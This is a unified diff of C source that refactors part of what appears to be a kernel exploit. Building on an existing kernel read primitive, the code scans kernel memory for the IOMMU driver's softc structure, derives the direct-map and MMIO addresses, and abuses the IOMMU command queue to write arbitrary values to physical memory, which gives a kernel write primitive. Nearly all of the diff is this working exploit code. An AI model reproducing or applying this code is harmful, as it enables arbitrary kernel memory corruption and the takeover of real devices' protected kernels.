@@ -2,50 +2,49 @@
 #include "kernel.h"
 #include "logger.h"
 
-int is_kernel_pointer(uintptr_t ptr) {
-  if (ptr == 0)
-    return -1;
+static inline int is_valid_kernel_heap_ptr(uintptr_t ptr) {
+  if (ptr == 0 || (ptr % sizeof(uintptr_t)))
+    return 0;
 
-  if (ptr % 8)
-    return -1;
+  if ((ptr >> 48) != 0xffff)
+    return 0;
 
-  if ((ptr >> 0x30) != 0xffff)
-    return -1;
-
-  uintptr_t heap_prefix = (ptr >> 0x20) & 0xffff;
+  uintptr_t heap_prefix = (ptr >> 32) & 0xffff;
 
   if (heap_prefix == 0xffff || heap_prefix == 0)
-    return -1;
+    return 0;
 
-  return 0;
+  return 1;
 }
 
 uintptr_t find_softc() {
   uintptr_t ptr;
-  uintptr_t mmio;
   uintptr_t sotfc;
+  uintptr_t mmio_vaddr;
   uintptr_t mmio_paddr;
 
   log("find softc started...");
 
-  for (uintptr_t addr = kaddrs.allproc; addr >= kaddrs.kdata; addr -= 8) {
+  uintptr_t addr = kaddrs.allproc;
+
+  while (addr >= kaddrs.kdata) {
     kread(&ptr, addr, sizeof(ptr));
 
-    if (is_kernel_pointer(ptr) == -1)
-      continue;
+    if (!is_valid_kernel_heap_ptr(ptr))
+      goto next;
 
-    kread(&mmio, ptr + 0x40, sizeof(mmio));
+    kread(&mmio_vaddr, ptr + 0x40, sizeof(mmio_vaddr));
 
-    if (is_kernel_pointer(mmio) == -1)
-      continue;
+    if (!is_valid_kernel_heap_ptr(mmio_vaddr))
+      goto next;
 
     kread(&mmio_paddr, ptr + 0x48, sizeof(mmio_paddr));
 
-    if (mmio_paddr == 0)
-      continue;
+    if (mmio_paddr != IOMMU_MMIO_BASE)
+      goto next;
 
-    if ((mmio & 0xffffffff) != mmio_paddr)
-      continue;
+    if (mmio_paddr != (uint32_t)mmio_vaddr)
+      goto next;
 
     log("found softc at %#lx", addr);
 
@@ -54,10 +53,16 @@ uintptr_t find_softc() {
     log("find softc completed !!");
 
     return sotfc;
+
+  next:
+    if (addr < kaddrs.kdata + 8)
+      break;
+
+    addr -= 8;
   }
 
   log("unable to find softc !!");
-  return -1;
+  return 0;
 }
 
 int iommu_init() {
@@ -65,7 +70,7 @@ int iommu_init() {
 
   uintptr_t kp = pfind(KERNEL_PID);
   uintptr_t kp_pmap = get_vm_map_pmap(kp);
-  if (kp_pmap == UINTPTR_MAX)
+  if (kp_pmap == 0)
     return -1;
 
   uintptr_t pml4;
@@ -75,9 +80,13 @@ int iommu_init() {
 
   kaddrs.dmap = pml4 - kaddrs.cr3;
   kaddrs.mmio = get_dmap(IOMMU_MMIO_BASE);
+  if (kaddrs.mmio == 0) {
+    log("unable to get mmio vaddr !!");
+    return -1;
+  }
 
   kaddrs.softc = find_softc();
-  if (kaddrs.softc == UINTPTR_MAX)
+  if (kaddrs.softc == 0)
     return -1;
 
   kread(&kaddrs.cb3, kaddrs.softc + 0x80, sizeof(kaddrs.cb3));
@@ -112,12 +121,12 @@ ssize_t iommu_write(uintptr_t vaddr, uint64_t value, size_t sz) {
   size_t n = sz < count ? sz : count;
 
   uint64_t mask =
-      n == 8 ? UINT64_MAX : ((1ul << (n * 8)) - 1) << (vaddr_offset * 8);
+      n == 8 ? UINT64_MAX : ((1ull << (n * 8)) - 1) << (vaddr_offset * 8);
   uint64_t new_value =
       (old_value & ~mask) | ((value << (vaddr_offset * 8)) & mask);
 
   uintptr_t paddr_aligned = get_paddr(vaddr_aligned);
-  if (paddr_aligned == UINTPTR_MAX)
+  if (paddr_aligned == 0)
     return -1;
 
   if (iommu_write_pa(paddr_aligned, new_value) == -1)
@@ -127,11 +136,11 @@ ssize_t iommu_write(uintptr_t vaddr, uint64_t value, size_t sz) {
     kread(&old_value, vaddr_aligned + sizeof(uint64_t), sizeof(old_value));
 
     n = sz - count;
-    mask = n == 8 ? UINT64_MAX : (1ul << (n * 8)) - 1;
+    mask = n == 8 ? UINT64_MAX : (1ull << (n * 8)) - 1;
     new_value = (old_value & ~mask) | ((value >> (count * 8)) & mask);
 
     paddr_aligned = get_paddr(vaddr_aligned + 8);
-    if (paddr_aligned == UINTPTR_MAX)
+    if (paddr_aligned == 0)
       return -1;
 
     if (iommu_write_pa(paddr_aligned, new_value) == -1)
@@ -146,7 +155,7 @@ ssize_t iommu_write_pa(uintptr_t paddr, uint64_t value) {
   uintptr_t cur_tail;
   uintptr_t cur_head;
 
-  if (paddr == 0 || (paddr % sizeof(uint64_t)) != 0)
+  if (paddr == 0 || (paddr % sizeof(uintptr_t)))
     return -1;
 
   log("iommu_write_pa => paddr: %#lx value: %#lx", paddr, value);
@@ -177,5 +186,5 @@ ssize_t iommu_write_pa(uintptr_t paddr, uint64_t value) {
       break;
   }
 
-  return 0;
+  return sizeof(uint64_t);
 }
